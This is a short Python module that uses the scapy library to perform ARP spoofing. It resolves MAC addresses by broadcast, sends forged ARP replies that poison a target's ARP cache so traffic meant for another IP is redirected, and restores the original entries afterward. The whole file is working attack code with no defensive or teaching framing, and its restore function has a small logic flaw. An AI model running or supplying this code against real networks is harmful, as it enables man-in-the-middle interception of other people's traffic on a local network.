#!/usr/bin/env python3
"""
arp_spoofing.py - ARP Spoofing module

This is a module to spoof ARP replies to a target. We are using scapy library.

"""

from scapy import all as scapy


def restore_ip(target_ip, source_ip):
    """ Restore the IP address of a target. """

    target_mac = request_mac_address(target_ip)
    source_mac = request_mac_address(source_ip)

    if target_ip and source_ip:
        scapy.send(scapy.ARP(op=2,
                            pdst=target_ip, hwdst=target_mac,
                            psrc=source_ip, hwsrc=source_mac), verbose=False)
    else:
        print('[!] Could not get MAC address for IP: {}'.format(target_ip))


def request_mac_address(ip):
    """ Send an ARP packet to an IP to receive the physical address. """

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(
        arp_request_broadcast,
        timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof_arp(target_ip, spoof_ip):
    """ Send an ARP packet to an IP with an spoofed IP. """

    mac_address = request_mac_address(target_ip)

    if mac_address:
        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address,
                psrc=spoof_ip), verbose=False)
    else:
        print('[!] Could not get MAC address for IP: {}'.format(target_ip))
